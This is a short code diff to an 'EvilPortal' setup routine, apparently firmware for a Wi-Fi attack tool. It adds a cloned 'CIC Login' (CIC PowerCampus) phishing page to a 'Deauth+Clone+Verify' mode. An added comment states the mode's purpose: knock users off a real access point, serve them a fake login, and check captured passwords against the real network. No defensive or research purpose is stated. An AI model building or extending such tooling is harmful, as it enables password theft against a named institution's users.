@@ -82,7 +82,12 @@ bool EvilPortal::setup() {
         options.insert(options.begin(), {"Google", [this]() { loadDefaultHtml(); }});
         options.insert(options.begin(), {"CIC Login", [this]() { loadDefaultHtml_cic(); }});
     } else {
+        // FINALE: verify mode (Deauth+Clone+Verify) must offer the same CIC
+        // PowerCampus clone the non-verify path serves, so the captured password
+        // is verified against the real AP. "Default" router page stays as an
+        // alternate. CIC inserted last => shown first.
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
+        options.insert(options.begin(), {"CIC Login", [this]() { loadDefaultHtml_cic(); }});
     }
 
     loopOptions(options);
